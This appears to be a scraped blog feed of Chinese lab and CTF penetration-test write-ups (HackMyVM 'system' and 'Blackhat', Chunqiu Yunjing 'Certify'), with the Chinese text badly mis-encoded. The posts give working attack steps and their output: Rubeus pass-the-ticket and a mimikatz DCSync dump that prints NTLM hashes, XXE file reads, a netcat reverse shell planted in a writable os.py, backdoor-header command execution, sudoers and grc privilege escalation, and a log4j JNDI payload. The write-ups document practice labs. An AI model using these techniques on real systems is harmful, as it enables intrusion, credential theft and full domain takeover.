dBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6F05kURrtAGLPwnEu0x0RxvAPS3m5aRx/bjVuGQLR7b0+L x5X557jubFee2VfyECSf1RICTWkdJttbkCj4s6IMQrVpe8jFgy3Uki4NC0WdUfzH1nIiJSCq0lRPzgI88NGOrQEbDaurBzq150lY i68ssuARb6DWCu6HYLjq66NSI53LNGAHqlNVoU+83ZOhJboPDjY2XL74OXFh0Qr57fWAbUOWegzVPHFicFshmeiMv111lfJr0X6Q aqATuWtvoSsDI+/v3HyGMlqmlqJmmt0coW9z0L6V52yL7XA2YfXod7N+hWb/gclV5+C1G7GNj/uM3Zi5DyJ9kk+IuWHKWRRrz7JR iPDy9zMJWBDgeMsEEmB/uh492tq+i3g8o49PocQ2TqcnRBPCiAEbpWhpz/LDb6P6f+ySqupcTcM5q9G+6CT6Rj/aMDAjqZEsRpfb agn3XEjKWbF+kpAuuvr+eGd0xICbySdM21JRTjqZmZmUPkEe5Y0zKH+wVUUVJOAv8BVeKirxdKtYyDYiudFtUUGGkIzt2Z3J1yJY GA8B90UklsraI8O6Q83i2nE11WkcxEXceYh7PBoeL6ivncb8UqZK2Nh07+1QlILNCx+5WFFLjNSoBLhofg3TIsPCr2zFNXTNbBPv zP+bjqJawf7BY0KUWNLvgAltKMXX1T9pzNREspsKwRMjXZgsyTbil3reoEciEexNtXVhWxrk+xbp9DIL/74f4rafpIMsi7myoH6a u1kjVexmmP4wOWp7KGvMm1gNp+XeakyHPiFlqIt4V0b4KGfd9Zd3rtQI3gtM7oeUm6PDlEn9vK0MVBpZZJeW6IDkZdXC7SBmPM1z p0uno3wGRj0MuqqnPaV8XRJR0sEaNGD8HABfQkdCMHm5GQ8w71AIEy9i2otNPegf6P0j4EPsNwtyo2o97GKu/y27tvKv1FH43S4G ij5gjiKBxIn2JtQ9oPvb0v+2SZWU08xE6v+b79PsWvr5STsl4eUJHnTuXizQfsY597gQAVgKD7vKeIXEsgb11VVP9HCtUjxCmBNS 25QzZvXbuWkEJ6k/7AYu0qvT3auHC1cbf4MmuMrc/DlT4MphkuUF5j8hfSEgEAVWhVZVuPZA3v6C+O8PYmDl1d9lT6JjZ5wuQrAG Dwt7+cZ9wzuWLDUkB1dtiTm0cuFLXAmOLLDjpSWxIXK2B9TNAagAq2slNrb775ovLLdo/swtuRAKazjqgCAygra59RWoqP+loVv8 nxii1cB/M4tFLpGuZlTdOnyME8JT8D40++QW5IxMPffywi5tpjhDUnVC1wtK49BOaljvJKH8LcWHWyALrv2j8De6HPabKhCcnDiY /w7QHVbcAh/Jo64uH2aYRSQEz5j7oGpAAP3ENCvzEaV8e/53wwRqjyife177PX7j9/ZfoqzfiRnr1kjeHIZsGw5zYyTmLbB/91Np RN2jgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCClV6tyB9NAYvRnxe9wuyHOhysxVh63TouQkdqL 8MLxbKEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDQxODAyMjgwNFqmERgPMjAy NTA0MTgxMjI4MDRapxEYDzIwMjUwNDI1MDIyODA0WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9S QU5HLkxBQg==[*] Ticket cache size: 1 å¯¼å…¥ TGT ç„¶å DCSync 1Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6rh73GDFsxBznVrGsdmcNb9fO1z8fVnV/kQUwXHY0vvUHSorZebamFLkiZi+LEkih3n4TJMOlCI8vlnlS5lPlr03uPc5nd6Pw7PWoVw7m2UH/TmMy4nuBKVVbKEIImNbFyhTleg75qJ+5D224ws/fpRGtQyH0WPmyMbevlI+xTTOLJGe9+YScZMva/hvc2nPq09ZNNzIMo8erEYpJCv1VucuzcoUrJFGTtASWqa0Aaeza+mypwP7OGmc2qnQEMu8l1XIEqe7JYdY934vsm37k8KarPLFlzyOhbzDW4t/GjlZ1aHXSLj332T90BxfZKoSe7tnA8cldicFQ8LmGBWBKeKms6sc8K4KQVGMdhyjno5L5jeKqtL49oc+a44kyJYlGjXnKpep5seUp3+2TXXvmF9/HnHSG+M6QQpepWGdfk6diRhgDvZyq1AX6GggRsXfIEpE721UcTowO2HQOfsv+W++pTiAoEvrkU6ciJ3VI3EZFelGkq3hfZ3MQydIdBCPVeaDwE1fcp05wGuDmuFDhf+C1nelwaTqYJIZScVgR+7o4FcGpStyycsbBMfzdasL70KSV3se6ZlvY24/Binnb3YOHMpWkpLRjUovQ7ep2fCN0f6Pt/P8JTCVC0oCFIy05otlw3n8nd4NctrNBWQBevIiuAobMrJ1Ww5UbSQHrCF6hTV6NTbL1irI3wR10rwNkaxWpspvcL5/HOTzXXRtq619o0lTdpz60KSroci5nuj4WfPtQ6ESiU8c4P9Y/exWUmhOGN10Wg1t4j4k+agTrvK2dy2ybLn1FNkqWMfMr3vcUm8BU7ESstKZp47FG1pkaQl6/bjGwElN0BhycbT8L1yxIj+rFspX3d6olXwiMIaF50EV5DM1V3oH/OJu5sHbIFqrGkRqooDTfrHyF8c1AnruzDtD2lxipt043llvOURkRj8Qd/qIiRZBqnYo4RD95J9J8Jbim35hFzbuV5PMS5Ekw9oRfzsGCD5VeKBb9i02mJTvWUqJjZi/YWI9wKaeKKCTKHYKKSmDfkJlF4gLUp12XwuTe4zEwhXUgBYEC7N7EA6u0/9dxwL5AWaRtOqL05rgFu2Ix2+wfBu1n4ToxGmYke44n6JSSXCqKW2KPkznAU0QPvhcYwjZsOFo4R/bVe9qQAcHBLwQ+9fq8DZBnRStKlgmIMeJXCPAPv5da69p2BnR4Bq+X71X5pWB4C0xHZtmxZ71ahe+cZYmDaap8SEvI7BDTkKaDDnvp3cLSVvX5k5uGrjq06yKqpYjlcfai1Yy8GXlecqf2xQ8b6RjkdPkHKVLQZdGZdZMc77Bj5IXwlGvwSQK5PMxo4z1zceza8WQ7WM/iIVwwDAEklXK9bW3pjfHCX9sB5YxAUA/BbJMxuSc1Q2yMpc8CrRNoNNPY184wjlPMAE0wLtAkkiJJlmhkupOA7ZpdlAwvYPEujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCCkn5s0Ub8lLXnRynzBbuyWO7uYW7F68Wp1NYL+h5IWoqEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI1MDIxMDA1Mjg0N1qmERgPMjAyNTAyMTAxNTI4NDdapxEYDzIwMjUwMjE3MDUyODQ3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg== 12345678910111213141516mimikatz.exe &quot;lsadump::dcsync /all /csv&quot;[DC] &#x27;xiaorang.lab&#x27; will be the domain[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server[DC] Exporting domain &#x27;xiaorang.lab&#x27;[rpc] Service : ldap[rpc] AuthnSvc : GSS_NEGOTIATE (9)502 krbtgt 767e06b9c74fd628dd13785006a9092b 5141105 Aldrich 98ce19dd5ce74f670d230c7b1aa016d0 5121106 Marcus b91c7cc463735bf0e599a2d0a04df110 5121112 WIN-3X7U15C2XDM$ c3ddf0ffd17c48e6c40e6eda9c9fbaf7 40961113 WIN-YUUAW2QG9MF$ 125d0e9790105be68deb6002690fc91b 40961000 DC01$ 23414273a692373e6e076d5fdbb2c213 532480500 Administrator 4889f6553239ace1f7c47fa2c619c252 5121103 FILESERVER$ dd213f63df5b16b2daa567705ca88ac7 40961104 WIN19$ b6547b5e9c27c42b5cb096f1c922bc3a 528384 å¯ä»¥æ‹¿åˆ°åŸŸæ§çš„å“ˆå¸Œ ç„¶åç™»å½•å³å¯ 1C:\\Users\\Administrator\\flag&gt; type flag04.txt","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-system","slug":"Hackmyvm-system","date":"2025-04-17T07:21:48.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2025/04/17/Hackmyvm-system/","permalink":"https://lvzhouhang.xyz/2025/04/17/Hackmyvm-system/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:72:be:a6 PCS Systemtechnik GmbH192.168.31.141 08:00:27:27:28:54 PCS Systemtechnik GmbH 192.168.31.141å°±æ˜¯é¶æœºip 12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.141Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 03:39 EDTNmap scan report for 192.168.31.141Host is up (0.0029s latency).Not shown: 998 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:27:28:54 (PCS Systemtechnik/Oracle VirtualBox virtual NIC) 80ç«¯å£æœ‰ä¸€ä¸ªç™»å½•çš„é¡µé¢ï¼Œé€šè¿‡æŸ¥çœ‹è¯·æ±‚å¤´å¯ä»¥å‘ç°ä»–æ˜¯ä»¥xmlçš„æ ¼å¼ä¼ è¾“çš„ 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;details&gt;&lt;email&gt;123@123.com&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt; è¯•ä¸€è¯•xxeæ³¨å…¥ 123&lt;!DOCTYPE test [ &lt;!ENTITY test1 SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;&lt;details&gt;&lt;email&gt;$test1;&lt;/email&gt;&lt;password&gt;123&lt;/password&gt;&lt;/details&gt; 12345678910111213141516171819202122232425262728&lt;p align=&#x27;center&#x27;&gt; &lt;font color=white size=&#x27;5pt&#x27;&gt; root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologinavahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinsshd:x:106:65534::/run/sshd:/usr/sbin/nologinsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologindavid:x:1000:1000::/home/david:/bin/bash is already registered! &lt;/font&gt; &lt;/p&gt; è¯»å–davidç”¨æˆ·çš„ç§é’¥å°è¯•ç™»å½•ï¼Œä½†æ˜¯ä¼šç™»å½•å¤±è´¥ï¼Œé€šè¿‡fuzzå¯ä»¥çŸ¥é“/home/davidè¿˜æœ‰ä¸€ä¸ª.viminfo 1ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.31.141/magic.php -d &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/david/FUZZ&quot;&gt; ]&gt; &lt;details&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;das&lt;/password&gt;&lt;/details&gt;&#x27; --fw 11 1234567891011121314151617181920212223242526272829303132333435363738 # This viminfo file was generated by Vim 8.2.# You may edit it if you&#x27;re careful!# Viminfo version|1,4# Value of &#x27;encoding&#x27; when this file was written*encoding=utf-8# hlsearch on (H) or off (h):~h# Command Line History (newest to oldest)::wq!|2,0,1648909714,,&quot;wq!&quot;# Search String History (newest to oldest):# Expression History (newest to oldest):# Input Line History (newest to oldest):# Debug Line History (newest to oldest):# Registers:# Password file Created:&#x27;0 1 3 /usr/local/etc/mypass.txt|4,48,1,3,1648909714,&quot;/usr/local/etc/mypass.txt&quot;# History of marks within files (newest to oldest):&gt; /usr/local/etc/mypass.txt * 1648909713 0 &quot; 1 3 ^ 1 4 . 1 3 + 1 3 ç„¶åè¯»å–/usr/local/etc/mypass.txtæ–‡ä»¶ davidçš„å¯†ç ä¸ºh4ck3rd4v!d ææƒä¸Šä¼ ä¸€ä¸ªpspy64æŸ¥çœ‹ï¼Œå‘ç°æ¯éš”ä¸€æ®µæ—¶é—´ä¼šè¿è¡Œä¸€æ¬¡suid.pyæ–‡ä»¶ 12025/04/18 04:01:01 CMD: UID=0 PID=670 | /bin/sh -c /usr/bin/python3.9 /opt/suid.py 12345678910111213141516171819202122#suid.pyfrom os import systemfrom pathlib import Path# Reading only first linetry: with open(&#x27;/home/david/cmd.txt&#x27;, &#x27;r&#x27;) as f: read_only_first_line = f.readline() # Write a new file with open(&#x27;/tmp/suid.txt&#x27;, &#x27;w&#x27;) as f: f.write(f&quot;&#123;read_only_first_line&#125;&quot;) check = Path(&#x27;/tmp/suid.txt&#x27;) if check: print(&quot;File exists&quot;) try: os.system(&quot;chmod u+s /bin/bash&quot;) except NameError: print(&quot;Done&quot;) else: print(&quot;File not exists&quot;)except FileNotFoundError: print(&quot;File not exists&quot;) è¿™ä¸ªè„šæœ¬æ°¸è¿œä¸ä¼šæ‰§è¡Œchmodï¼ŒæŸ¥çœ‹æ˜¯å¦å¯ä»¥åŠ«æŒ 1234python3 -c &#x27;import sys; print(sys.path)&#x27;[&#x27;&#x27;, &#x27;/usr/lib/python39.zip&#x27;, &#x27;/usr/lib/python3.9&#x27;, &#x27;/usr/lib/python3.9/lib-dynload&#x27;, &#x27;/usr/local/lib/python3.9/dist-packages&#x27;, &#x27;/usr/lib/python3/dist-packages&#x27;]david@system:/usr/lib/python3.9$ find ./ -writable 2&gt;/dev/null./os.py å‘os.pyå°¾éƒ¨æ·»åŠ  12345import subprocessdef shell(): import subprocess subprocess.call(&quot;nc&quot; + &quot;192.168.31.129 9999 -e /bin/bash&quot;, shell=True)shell() ç„¶åç›‘å¬ä¸€ä¸ªç«¯å£é™é™ç­‰shellå¼¹å›æ¥ 12iduid=0(root) gid=0(root) groups=0(root)","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Blackhat","slug":"Hackmyvm-Blackhat","date":"2025-04-17T04:14:42.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/04/17/Hackmyvm-Blackhat/","permalink":"https://lvzhouhang.xyz/2025/04/17/Hackmyvm-Blackhat/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -læ‰«æ 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:73:b2:7a PCS Systemtechnik GmbH192.168.31.140 08:00:27:19:a9:32 PCS Systemtechnik GmbH 192.168.31.140æ˜¯é¶æœºåœ°å€ ç„¶åæ‰«æç«¯å£ 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.140Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-17 00:16 EDTNmap scan report for 192.168.31.140Host is up (0.0019s latency).Not shown: 999 closed tcp ports (reset)PORT STATE SERVICE80/tcp open httpMAC Address: 08:00:27:19:A9:32 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds åªå¼€äº†ä¸€ä¸ª80ç«¯å£ï¼Œæ‰«æä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«æåˆ°ä¸€ä¸ªphpinfo.php 1Loaded Modules core mod_so mod_watchdog http_core mod_log_config mod_logio mod_version mod_unixd mod_access_compat mod_alias mod_auth_basic mod_authn_core mod_authn_file mod_authz_core mod_authz_host mod_authz_user mod_autoindex mod_backdoor mod_deflate mod_dir mod_env mod_filter mod_mime prefork mod_negotiation mod_php7 mod_reqtimeout mod_setenvif mod_status mod_backdoor å­˜åœ¨æ¼æ´ 123â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# curl 192.168.31.140 -H &quot;Backdoor: id&quot;uid=33(www-data) gid=33(www-data) groups=33(www-data) åå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œä¸Šä¼  linpeas.sh ï¼Œè¿è¡Œçœ‹ç»“æœ 12345678â•”â•â•â•â•â•â•â•â•â•â•â•£ Files with ACLs (limited to 50)â•š https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls# file: /etc/sudoersUSER root r--user darkdante rw-GROUP root r--mask rw-other --- å¯ä»¥çœ‹åˆ°sudoersæ–‡ä»¶darkdanteæœ‰å†™çš„æƒé™ï¼Œdarkdanteç›´æ¥suå°±ç™»å½•äº†å“ˆå“ˆå“ˆå“ˆå“ˆ å†™å…¥sudoersæ–‡ä»¶ 1darkdante ALL=(ALL:ALL) ALL ç„¶åsudo suï¼ŒææƒæˆåŠŸ","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"æ˜¥ç§‹äº‘é•œ-Certify","slug":"æ˜¥ç§‹äº‘é•œ-Certify","date":"2025-04-16T15:55:55.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/04/16/æ˜¥ç§‹äº‘é•œ-Certify/","permalink":"https://lvzhouhang.xyz/2025/04/16/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Certify/","excerpt":"","text":"FLAG1å…ˆç”¨fscanæ‰«ä¸€æ‰« 1234567891011121314151617181920212223242526272829â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ../pentest/fscan/fscan2 -h 39.99.135.211â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-16 11:59:40] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-16 11:59:40] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-16 11:59:40] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1[2025-04-16 11:59:41] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-16 11:59:41] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-16 11:59:41] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.135.211:22[2025-04-16 11:59:41] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.135.211:80[2025-04-16 11:59:41] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.135.211:22 =&gt; [ssh] ç‰ˆæœ¬:8.2p1 Ubuntu 4ubuntu0.5 äº§å“:OpenSSH ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-16 11:59:45] [SUCCESS] ç«¯å£å¼€æ”¾ 39.99.135.211:8983[2025-04-16 11:59:46] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.135.211:80 =&gt; [http] ç‰ˆæœ¬:1.18.0 äº§å“:nginx ç³»ç»Ÿ:Linux ä¿¡æ¯:Ubuntu[2025-04-16 11:59:55] [SUCCESS] æœåŠ¡è¯†åˆ« 39.99.135.211:8983 =&gt; [http] äº§å“:Apache Solr Banner:[HTTP/1.1 302 Found.Location: http://172.22.9.19:8983/solr/.][2025-04-16 11:59:55] [INFO] å­˜æ´»ç«¯å£æ•°é‡: 3[2025-04-16 11:59:55] [INFO] å¼€å§‹æ¼æ´æ‰«æ[2025-04-16 11:59:55] [INFO] åŠ è½½çš„æ’ä»¶: ssh, webpoc, webtitle[2025-04-16 11:59:55] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.135.211 çŠ¶æ€ç :200 é•¿åº¦:612 æ ‡é¢˜:Welcome to nginx![2025-04-16 11:59:56] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.135.211:8983 çŠ¶æ€ç :302 é•¿åº¦:0 æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://39.99.135.211:8983/solr/[2025-04-16 11:59:57] [SUCCESS] ç½‘ç«™æ ‡é¢˜ http://39.99.135.211:8983/solr/ çŠ¶æ€ç :200 é•¿åº¦:16555 æ ‡é¢˜:Solr Admin[2025-04-16 12:00:04] [SUCCESS] æ‰«æå·²å®Œæˆ: 5/5 39.99.135.211:8983æ˜¯ä¸€ä¸ªsolré¢æ¿ï¼Œå­˜åœ¨log4jæ¼æ´ 1http://39.99.135.211:8983/solr/admin/cores?action=$&#123;jndi:ldap://tc94uide908k5qcv0xurpcoorfx6lw9l.oastify.com&#125; ä¸Švpsï¼Œå¯ä»¥åˆ©ç”¨java-chainsåå¼¹ä¸€ä¸ªshell,åå¼¹çš„shellå¦‚æœä¸èˆ’æœå¯ä»¥å†™ä¸€ä¸ªå…¬é’¥è¿›å» 12345678solr@ubuntu:/opt/solr$ sudo -lsudo -lMatching Defaults entries for solr on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser solr may run the following commands on ubuntu: (root) NOPASSWD: /usr/bin/gr ææƒsudo grc --pty /bin/sh 123solr@ubuntu:~$ sudo grc --pty /bin/sh# iduid=0(root) gid=0(root) groups=0(root) ææƒåˆ°rootåï¼Œå†™ä¸€ä¸ªå…¬é’¥è¿›å»ï¼Œflag01åœ¨/root/flagä¸‹ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ªfscanï¼Œå†åšä¸€ä¸ªä»£ç† FLAG2æŸ¥çœ‹ä¸€ä¸‹å†…ç½‘çš„ipç«¯ï¼Œå¼€æ‰«ï¼ 12345678910111213root@ubuntu:/tmp# ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:26:2b:c3 brd ff:ff:ff:ff:ff:ff inet 172.22.9.19/16 brd 172.22.255.255 scope global dynamic eth0 valid_lft 315357456sec preferred_lft 315357456sec inet6 fe80::216:3eff:fe26:2bc3/64 scope link valid_lft forever preferred_lft forever 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485root@ubuntu:/tmp# ./fscan2 -h 172.22.9.19/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.0[2025-04-17 00:40:03] [INFO] æš´åŠ›ç ´è§£çº¿ç¨‹æ•°: 1[2025-04-17 00:40:03] [INFO] å¼€å§‹ä¿¡æ¯æ‰«æ[2025-04-17 00:40:03] [INFO] CIDRèŒƒå›´: 172.22.9.0-172.22.9.255[2025-04-17 00:40:03] [INFO] ç”ŸæˆIPèŒƒå›´: 172.22.9.0.%!d(string=172.22.9.255) - %!s(MISSING).%!d(MISSING)[2025-04-17 00:40:03] [INFO] è§£æCIDR 172.22.9.19/24 -&gt; IPèŒƒå›´ 172.22.9.0-172.22.9.255[2025-04-17 00:40:03] [INFO] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[2025-04-17 00:40:03] [INFO] å¼€å§‹ä¸»æœºæ‰«æ[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.19 å­˜æ´» (ICMP)[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.7 å­˜æ´» (ICMP)[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.26 å­˜æ´» (ICMP)[2025-04-17 00:40:03] [SUCCESS] ç›®æ ‡ 172.22.9.47 å­˜æ´» (ICMP)[2025-04-17 00:40:06] [INFO] å­˜æ´»ä¸»æœºæ•°é‡: 4[2025-04-17 00:40:06] [INFO] æœ‰æ•ˆç«¯å£æ•°é‡: 233[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:88[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:80[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:80[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:22[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.19:80[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:21[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.19:22[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:445[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.26:445[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:445[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:389[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.47:139[2025-04-17 00:40:06] [SUCCESS] ç«¯å£å¼€æ”¾ 172.22.9.7:139[2025-04-17 00:40:06] [SUCCESS] 